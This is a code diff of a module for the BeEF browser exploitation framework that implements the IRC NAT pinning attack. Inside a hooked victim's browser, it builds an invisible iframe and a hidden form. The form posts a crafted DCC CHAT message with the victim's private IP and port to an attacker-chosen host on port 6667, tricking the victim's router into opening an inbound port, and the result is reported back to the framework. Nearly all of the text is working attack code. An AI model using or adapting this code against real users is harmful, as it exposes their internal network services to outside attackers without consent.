@@ -22,47 +22,33 @@ beef.execute(function() {
     var d = dot.split('.');
     return (((+d[0])*256+(+d[1]))*256+(+d[2]))*256+(+d[3]);
   }
+    
+  var myIframe = beef.dom.createInvisibleIframe();
+  var myForm = document.createElement("form");
+  var action = connectto + ":6667/"
  
-  //send a request
-  function send_msg(privateip,privateport,connectto){
+  myForm.setAttribute("name", "data");
+  myForm.setAttribute("method", "post");
+  //it must be multipart/form-data so the message appears on separate line
+  myForm.setAttribute("enctype", "multipart/form-data");
+  myForm.setAttribute("action", action);
+
     
-    //create hidden iFrame
-    var iframe = document.createElement("iframe");
-    iframe.setAttribute("id","irc_nat_pinning_<%= @command_id %>");
-    iframe.setAttribute("style", "visibility:hidden; width:1px; height: 1px;");
-    document.body.appendChild(iframe);
-    iframe = document.getElementById("irc_nat_pinning_<%= @command_id %>");
+  //create message, refer Samy Kamkar (http://samy.pl/natpin/)
+  x = String.fromCharCode(1);
+  var s = 'PRIVMSG beef :'+x+'DCC CHAT beef '+dot2dec(privateip)+' '+privateport+x+"\n";
 
+  //create message textarea
+  var myExt = document.createElement("textarea");
+  myExt.setAttribute("id","msg_<%= @command_id %>");
+  myExt.setAttribute("name","msg_<%= @command_id %>");
+  myForm.appendChild(myExt);
+  myIframe.contentWindow.document.body.appendChild(myForm);
 
-    //create form
-    var action = connectto + ":6667/"
-    var myform = document.createElement("form");
-    myform.setAttribute("name", "data");
-    myform.setAttribute("method", "post");
-    myform.setAttribute("enctype", "multipart/form-data");
-    myform.setAttribute("action", action);
-    iframe.contentWindow.document.body.appendChild(myform);
-
-    //create message, refer Samy Kamkar (http://samy.pl/natpin/)
-    x = String.fromCharCode(1);
-    var s = 'PRIVMSG beef :'+x+'DCC CHAT beef '+dot2dec(privateip)+' '+privateport+x+"\n";
-
-    //create message textarea
-    var myExt = document.createElement("textarea");
-    myExt.setAttribute("id","msg_<%= @command_id %>");
-    myExt.setAttribute("name","msg_<%= @command_id %>");
-    myform.appendChild(myExt);
-
-    //send message
-    iframe.contentWindow.document.getElementById("msg_<%= @command_id %>").value = s;
-    myform.submit(); 
-    alert(s);
+  //send message
+  myIframe.contentWindow.document.getElementById("msg_<%= @command_id %>").value = s;
+  myForm.submit(); 
     
-    //clean up
-    setTimeout('document.body.removeChild(document.getElementById("irc_nat_pinning_<%= @command_id %>"));', 15000);
-  } 
-
-  send_msg(privateip,privateport,connectto);
   beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Message sent');
 
 });
